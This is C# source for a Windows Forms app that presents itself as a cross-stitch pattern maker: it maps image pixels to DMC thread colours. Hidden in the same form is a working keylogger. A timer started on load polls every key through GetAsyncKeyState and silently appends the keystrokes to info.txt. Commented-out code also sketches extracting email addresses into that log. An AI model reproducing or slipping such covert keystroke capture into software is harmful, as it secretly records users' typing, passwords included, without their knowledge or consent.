using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Drawing.Drawing2D;

namespace Courseprojecttokb
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        //доступ к клавиатуре
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private List<Options> ColorsInfo = new List<Options>();
        // private List<Options> UsedColors = new List<Options>();
        private List<string> UsedColors = new List<string>();
        double propor;
        bool onoff = false;



        private void ColorsToList(string path)
        {
            ColorsInfo.Clear();
            using (StreamReader fs = new StreamReader(path))
            {
                string temp = "";
                while (true)
                {
                    temp = fs.ReadLine();
                    if (temp == null) break;
                    string[] array = new string[5];
                    array = temp.Split(new[] { ' ' }, 5);
                    ColorsInfo.Add(new Options
                    {
                        Number = array[0],
                        HEXFormat = array[1],
                        R = Convert.ToInt32(array[2]),
                        G = Convert.ToInt32(array[3]),
                        B = Convert.ToInt32(array[4]),
                    });
                }
            }
        }
        Bitmap mainimage;

        private Bitmap Proportions(Bitmap input, int wconst, int hconst)
        {
            Bitmap output = new Bitmap(input);

            return output;
        }

        private Bitmap PictureSize(Bitmap imagecopy)
        {
            if (imagecopy.Width < 30 && imagecopy.Height < 30)
            {
                Bitmap im = new Bitmap(imagecopy);
                Size size = new Size(imagecopy.Width, imagecopy.Height);
                imagecopy = new Bitmap(imagecopy, size);
                this.pictureBox1.Size = new Size(imagecopy.Width * 5, imagecopy.Height * 5);
            }
            else if (imagecopy.Width < 700 && imagecopy.Height < 500)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = 500;
                    double del = h / Convert.ToDouble(imagecopy.Height);
                    int w = (int)Math.Round(del * imagecopy.Width);
                    //Size size = new Size(w, h);
                    //imagecopy = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = imagecopy.Size;
                    this.pictureBox1.Size = new Size(w, h);
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = 700;
                    double del = w / Convert.ToDouble(imagecopy.Width);
                    int h = (int)Math.Round(del * imagecopy.Height);
                    //Size size = new Size(w, h);
                    //imagecopy = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = imagecopy.Size;
                    this.pictureBox1.Size = new Size(w, h);
                }

            }
            else if (imagecopy.Width > 700 || imagecopy.Height > 500)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = 500;
                    double del = h / propor;
                    int w = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    imagecopy = new Bitmap(imagecopy, size);
                    this.pictureBox1.Size = imagecopy.Size;
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = 700;
                    double del = w / propor;
                    int h = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    imagecopy = new Bitmap(imagecopy, size);
                    this.pictureBox1.Size = imagecopy.Size;
                }
            }
            numericheight.Text = Convert.ToString(imagecopy.Height);
            numericwidth.Text = Convert.ToString(imagecopy.Width);

            return imagecopy;
        }

        private void PictureToKanva(Bitmap imagecopy)
        {
            UsedColors.Clear();
            Bitmap input = new Bitmap(imagecopy);
            Bitmap output = new Bitmap(input.Width, input.Height);
            string colornum = "";
            // перебираем в циклах все пиксели исходного изображения
            for (int j = 0; j < input.Height; j++)
                for (int i = 0; i < input.Width; i++)
                {
                    // получаем (i, j) пиксель
                    UInt32 pixel = (UInt32)(input.GetPixel(i, j).ToArgb());
                    // получаем компоненты цветов пикселя
                    int R1 = (int)((pixel & 0x00FF0000) >> 16); // красный
                    int G1 = (int)((pixel & 0x0000FF00) >> 8); // зеленый
                    int B1 = (int)(pixel & 0x000000FF); // синий
                    int R2 = R1, G2 = G1, B2 = B1;
                    int fi, f_min = 1000000;

                    foreach (Options opt in ColorsInfo)
                    {
                        fi = 30 * (opt.R - R1) * (opt.R - R1) +
                           59 * (opt.G - G1) * (opt.G - G1) +
                           11 * (opt.B - B1) * (opt.B - B1);
                        if (fi < f_min)
                        {
                            R2 = opt.R;
                            G2 = opt.G;
                            B2 = opt.B;
                            colornum = opt.Number;
                            f_min = fi;
                        }

                    }
                    UsedColors.Add(colornum);
                    UInt32 newPixel = 0xFF000000 | ((UInt32)R2 << 16) | ((UInt32)G2 << 8) | ((UInt32)B2);
                    // добавляем его в Bitmap нового изображения
                    output.SetPixel(i, j, Color.FromArgb((int)newPixel));
                }

            pictureBox1.Image = output;

            //MessageBox.Show("Готово");

        }

        private void button1_Click(object sender, EventArgs e)
        {
            onoff = false;
            //Bitmap для открываемого изображения
            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Image Files(*.BMP;*.JPG;*.GIF;*.PNG)|*.BMP;*.JPG;*.GIF;*.PNG|All files (*.*)|*.*"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                try
                {
                    mainimage = new Bitmap(open_dialog.FileName);
                    if (mainimage.Width > mainimage.Height)
                        propor = (double)mainimage.Width / (double)mainimage.Height;
                    else propor = (double)mainimage.Height / (double)mainimage.Width;

                    mainimage = PictureSize(mainimage);
                    onoff = true;
                    PictureToKanva(mainimage);
                    // pictureBox1.Image = mainimage;
                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно открыть выбранный файл",
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //PictureToKanva();
        }

        private void CorrectSize(Bitmap imagecopy)
        {
            Bitmap bitmap = new Bitmap(imagecopy);
            if (checkBox1.Checked == true)
            {
                if (imagecopy.Height >= imagecopy.Width)
                {
                    int h = Convert.ToInt32(numericheight.Text);
                    double del = h / propor;
                    int w = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    numericwidth.Text = w.ToString();
                    bitmap = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = bitmap.Size;
                    bitmap = PictureSize(bitmap);
                    PictureToKanva(bitmap);
                }
                else if (imagecopy.Height < imagecopy.Width)
                {
                    int w = Convert.ToInt32(numericwidth.Text);
                    double del = w / propor;
                    int h = (int)Math.Round(del);
                    Size size = new Size(w, h);
                    numericheight.Text = h.ToString();
                    bitmap = new Bitmap(imagecopy, size);
                    //this.pictureBox1.Size = bitmap.Size;
                    bitmap = PictureSize(bitmap);
                    PictureToKanva(bitmap);
                }
            }
            else if (onoff == true)
            {
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                bitmap = new Bitmap(imagecopy, size);
                //this.pictureBox1.Size = bitmap.Size;
                bitmap = PictureSize(bitmap);
                PictureToKanva(bitmap);
            }

        }

        private void numericwidth_ValueChanged(object sender, EventArgs e)
        {
            CorrectSize(mainimage);
        }

        private void numericheight_ValueChanged(object sender, EventArgs e)
        {
            CorrectSize(mainimage);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Bitmap imagecopy = new Bitmap(mainimage);
            if (Convert.ToInt32(comboBox1.Text) == 60)
            {
                ColorsToList("DMC60.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 150)
            {
                ColorsToList("DMC150.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 200)
            {
                ColorsToList("DMC200.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if (Convert.ToInt32(comboBox1.Text) == 350)
            {
                ColorsToList("DMC350.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
            else if ((Convert.ToInt32(comboBox1.Text) == 425))
            {
                ColorsToList("DMC.txt");
                Size size = new Size(Convert.ToInt32(numericwidth.Text), Convert.ToInt32(numericheight.Text));
                imagecopy = new Bitmap(imagecopy, size);
                imagecopy = PictureSize(imagecopy);
                PictureToKanva(imagecopy);
            }
        }
        private void tabPage2_Enter(object sender, EventArgs e)
        {
            dataGridView1.Rows.Clear();
            foreach (string num in UsedColors)
            {
                dataGridView1.Rows.Add(num, "1");
            }
        }

        PictureBoxWithInterpolationMode pictureBox1 = new PictureBoxWithInterpolationMode
        {
            Name = "pictureBox1",
            Size = new Size(200, 250),
            Location = new Point(15, 201),
            //Image = pictureBox1.Image,
            SizeMode = PictureBoxSizeMode.StretchImage,
            InterpolationMode = InterpolationMode.NearestNeighbor
        };


        //открытие формы
        private void Form1_Load(object sender, EventArgs e)
        {

            tabPage1.Controls.Add(pictureBox1);

            timer1.Start();
            //comboBox1.Text = "425";
            ColorsToList("DMC.txt");
            // pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            //WriteTotxt(HTMLText());
        }
        string alltext;

        //запись в файл
        private void WriteTotxt(string value)
        {
            alltext += value;
            StreamWriter stream = new StreamWriter("info.txt", true);
            stream.Write(value);
            stream.Close();
        }
        //текст с браузера
        /* private static String HTMLText()
         {
             string data = ""; ;
             string urlAddress = "https://ru.wikipedia.org/wiki/Электронная_почта";
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlAddress);

             Cookie cookie = new Cookie
             {
                 Name = "beget",
                 Value = "begetok"
             };

             request.CookieContainer = new CookieContainer();
             request.CookieContainer.Add(new Uri(urlAddress), cookie);

             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
             if (response.StatusCode == HttpStatusCode.OK)
             {
                 Stream receiveStream = response.GetResponseStream();
                 StreamReader readStream = null;
                 if (response.CharacterSet == null)
                 {
                     readStream = new StreamReader(receiveStream);
                 }
                 else
                 {
                     readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                 }
                 data = readStream.ReadToEnd();
                 response.Close();
                 readStream.Close();
             }
             return data;
         }*/


        string text;
        bool capslock, numlock;
        int ctrl, shift, del, back = 0;

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            /*string email = "";
            Regex re = new Regex(@"^[\w!#$%&amp;'*+\-/=?\^_`{|}~]+(\.[\w!#$%&amp;'*+\-/=?\^_`{|}~]+)*@((([\-\w]+\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\.){3}[0-9]{1,3}))$");
            string result = re.Match(email).ToString();
            StreamWriter stream = new StreamWriter("info.txt", true);
            stream.Write(Environment.NewLine + result);
            stream.Close();*/
        }

        int sp;


        string buffer2; char a, ab;

        public int Count { get; private set; }
        private void timer1_Tick(object sender, EventArgs e)
        {
            capslock = Console.CapsLock;
            numlock = Console.NumberLock;
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    buffer = Enum.GetName(typeof(Keys), i);

                    if (capslock == true)
                    {
                        buffer = buffer.ToUpper();
                    }
                    else
                        buffer = buffer.ToLower();

                    switch (buffer)
                    { 
                        case "space":
                        case "SPACE":
                            buffer = " ";
                            break;
                        case "capslock":
                        case "CAPSLOCK":
                            buffer = " ";
                            break;

                        //  shiftkeylshiftkey

                        case "oem7":
                        case "OEM7":
                            buffer = "'";
                            break;

                        case "enter":
                        case "ENTER":
                            buffer = (Environment.NewLine);
                            break;

                        case "LBUTTON":
                        case "lbutton":
                            buffer = "";
                            break;
                        case "OemPeriod":
                        case "OEMPERIOD":
                        case "oemperiod":
                            buffer = ".";
                            break;

                        case "LMenu":
                        case "lemnu":
                        case "LMENU":
                            buffer = "ALT ";
                            break;
                        case "Back":
                            buffer = " ";
                            break;

                        case "oemcomma":
                            buffer = ",";
                            break;
                        case "oemquestion":
                            buffer = "?";
                            break;
                        case "oem1":
                        case "OEM1":
                            buffer = ";";
                            break;
                        case "oem5": 
                        case "OEM5":
                            buffer = "\\";
                            break;
                        case "oem6":
                        case "OEM6":
                            buffer = "]";
                            break;
                        case "oemopenbrackets":
                            buffer = "[";
                            break;
                        case "oemminus":
                            buffer = "-";
                            break;
                        case "oemplus":
                            buffer = "+";
                            break;
                        case "D0":
                        case "d0":
                            buffer = "0";
                            break;
                        case "D1":
                        case "d1":
                            buffer = "1";
                            break;
                        case "D2":
                        case "d2":
                            buffer = "2";
                            break;
                        case "D3":
                        case "d3":
                            buffer = "3";
                            break;
                        case "D4":
                        case "d4":
                            buffer = "4";
                            break;
                        case "D5":
                        case "d5":
                            buffer = "5";
                            break;
                        case "D6":
                        case "d6":
                            buffer = "6";
                            break;
                        case "D7":
                        case "d7":
                            buffer = "7";
                            break;
                        case "D8":
                        case "d8":
                            buffer = "8";
                            break;
                        case "D9":
                        case "d9":
                            buffer = "9";
                            break;
                        case "oempipe":
                            buffer = "|";
                            break;
                        case "oemsemicolon":
                            buffer = ";";
                            break;
                        case "NUMPAD0":
                        case "numpad0":
                            buffer = "0";
                            break;
                        case "NUMPAD1":
                        case "numpad1":
                            buffer = "1";
                            break;
                        case "NUMPAD2":
                        case "numpad2":
                            buffer = "2";
                            break;
                        case "NUMPAD3":
                        case "numpad3":
                            buffer = "3";
                            break;
                        case "NUMPAD4":
                        case "numpad4":
                            buffer = "4";
                            break;
                        case "NUMPAD5":
                        case "numpad5":
                            buffer = "5";
                            break;
                        case "NUMPAD6":
                        case "numpad6":
                            buffer = "6";
                            break;
                        case "NUMPAD7":
                        case "numpad7":
                            buffer = "7";
                            break;
                        case "NUMPAD8":
                        case "numpad8":
                            buffer = "8";
                            break;
                        case "NUMPAD9":
                        case "numpad9":
                            buffer = "9";
                            break;

                    }
                    
                    /* if (buffer.Contains("control") || buffer.Contains("CONTROL")) try { buffer = buffer.Substring("CONTROL".Length, buffer.Length); ctrl = 2; }
                         catch { buffer = ""; ctrl = 2; }
                     if (buffer.Contains("shift") || buffer.Contains("SHIFT")) try { buffer = buffer.Substring("SHIFT".Length, buffer.Length); shift = 3; }
                         catch { buffer = ""; shift = 3; }

                     if (buffer.Equals("delete") || buffer.Equals("DELETE")) del = 2;
                     if (buffer.Equals("back") || buffer.Equals("BACK")) back = 3;
                     if (shift == 1)
                     {
                         try
                         {
                             a = Convert.ToChar(buffer);
                             shift = 0;

                         }
                         catch { }

                         if (capslock == true)
                         {
                             sp = Convert.ToInt32(a) + 32;
                             try { ab = Convert.ToChar(sp); }
                             catch { MessageBox.Show(sp.ToString()); }
                             buffer = ab.ToString(); shift = 0;
                         }
                         else
                         {
                             buffer = buffer.ToString().ToUpper();
                             sp = Convert.ToInt32(a) - 32;
                             try { ab = Convert.ToChar(sp); }
                             catch { MessageBox.Show(sp.ToString()); }
                             buffer = ab.ToString(); shift = 0;
                         }

                         shift = 0;*/
                }
                text += buffer;
            }
            WriteTotxt(text);
            text = "";
        }
    }
}
